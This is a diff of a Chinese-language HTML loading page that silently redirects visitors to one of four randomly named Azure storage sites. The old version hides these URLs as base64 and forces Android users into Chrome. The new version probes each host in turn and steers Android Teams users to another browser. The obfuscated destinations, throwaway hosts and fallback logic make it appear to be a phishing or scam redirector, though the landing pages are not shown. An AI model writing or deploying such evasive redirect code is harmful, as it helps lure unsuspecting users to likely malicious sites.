@@ -1,85 +1,143 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <title>跳转中...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body {
-      margin: 0;
-      background: #f4f4f4;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      color: #333;
-    }
-    .message {
-      text-align: center;
-      display: none;
-    }
-    .fail {
-      color: #c00;
-    }
-  </style>
+<meta charset="utf-8">
+<title>正在加载…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body, html {
+    height: 100%;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #f7f9fb;
+    font-family: Segoe UI, Roboto, Helvetica;
+    text-align: center;
+    padding: 0 20px;
+  }
+  #bar {
+    width: 60%;
+    height: 6px;
+    border-radius: 3px;
+    overflow: hidden;
+    background: #dde3ec;
+    box-shadow: 0 0 3px rgba(0,0,0,.08) inset;
+  }
+  #bar::after {
+    content: '';
+    display: block;
+    height: 100%;
+    width: 0;
+    background: #4f71ff;
+    animation: load 2s linear infinite;
+  }
+  @keyframes load {
+    0% {width: 0}
+    50% {width: 100%}
+    100% {width: 0}
+  }
+  #err {
+    display: none;
+    color: #666;
+  }
+  #err h1 {
+    font-size: 20px;
+    margin: 16px 0 8px;
+  }
+  #err p {
+    margin: 0 0 16px;
+  }
+  #err button {
+    padding: 8px 16px;
+    border: none;
+    border-radius: 4px;
+    background: #4f71ff;
+    color: #fff;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  #alt {
+    display: none;
+    color: #666;
+  }
+  #alt h1 {
+    font-size: 20px;
+    margin: 16px 0 8px;
+  }
+  #alt a {
+    display: inline-block;
+    margin-top: 12px;
+    padding: 8px 16px;
+    background: #4f71ff;
+    color: #fff;
+    text-decoration: none;
+    border-radius: 4px;
+    font-size: 14px;
+  }
+</style>
 </head>
 <body>
-  <div class="message" id="loadingMsg">正在跳转，请稍候...</div>
-  <div class="message fail" id="failMsg">项目维护中，请稍后再试。</div>
+<div id="bar"></div>
 
-  <script>
-    // base64 编码的 URL 列表（加密）
-    const encodedUrls = [
-      "aHR0cHM6Ly9pd3RxMjVkaHIuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
-      "aHR0cHM6Ly9meDRpdWc1cXNwLmJsb2IuY29yZS53aW5kb3dzLm5ldC9ob21lL2luZGV4Lmh0bWw=",
-      "aHR0cHM6Ly9oamRrYzg3MzFtaXcuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
-      "aHR0cHM6Ly94OTN5djJjYWs1dzguejQ4LndlYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA=="
-    ];
+<div id="err">
+  <h1>哎呀，加载失败了…</h1>
+  <p>请检查网络或稍后重试</p>
+  <button onclick="retry()">重新尝试</button>
+</div>
 
-    const isAndroid = /android/i.test(navigator.userAgent);
-    const loadingMsg = document.getElementById("loadingMsg");
-    const failMsg = document.getElementById("failMsg");
+<div id="alt">
+  <h1>您的手机暂时不支持</h1>
+  <p>请到应用商店下载 EDGE 浏览器访问</p>
+  <a href="https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html" target="_blank">备用地址</a>
+</div>
 
-    loadingMsg.style.display = "block";
+<script>
+(async function () {
+  const urls = [
+    "https://iwtq25dhr.blob.core.windows.net/home/index.html",
+    "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
+    "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
+    "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
+  ];
+  const isAndroid = /android/i.test(navigator.userAgent);
+  const isTeams = /Teams/i.test(navigator.userAgent);
+  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
 
-    let redirected = false;
+  // 安卓端 Teams 内部浏览器兼容问题提示
+  if (isAndroid && isTeams) {
+    showAlt();
+    return;
+  }
 
-    function base64Decode(str) {
-      try {
-        return atob(str);
-      } catch (e) {
-        return null;
-      }
+  const TIMEOUT = 4000;
+
+  for (const u of urls) {
+    try {
+      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
+      location.replace(u);
+      return;
+    } catch (e) {
+      // try next URL
     }
+  }
 
-    function tryNext(index) {
-      if (index >= encodedUrls.length) {
-        loadingMsg.style.display = "none";
-        failMsg.style.display = "block";
-        return;
-      }
+  showError();
+})();
 
-      const url = base64Decode(encodedUrls[index]);
-      if (!url) return tryNext(index + 1);
+function showError() {
+  document.getElementById("bar").style.display = "none";
+  document.getElementById("err").style.display = "block";
+}
 
-      const img = new Image();
-      img.onload = () => {
-        if (redirected) return;
-        redirected = true;
+function showAlt() {
+  document.getElementById("bar").style.display = "none";
+  document.getElementById("alt").style.display = "block";
+}
 
-        if (isAndroid) {
-          // Android 强制跳转 Chrome 浏览器
-          window.location.href = `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
-        } else {
-          window.location.href = url;
-        }
-      };
-      img.onerror = () => tryNext(index + 1);
-      img.src = url + "?ping=" + Date.now();
-    }
-
-    setTimeout(() => tryNext(0), 300);
-  </script>
+function retry() {
+  location.reload();
+}
+</script>
 </body>
 </html>
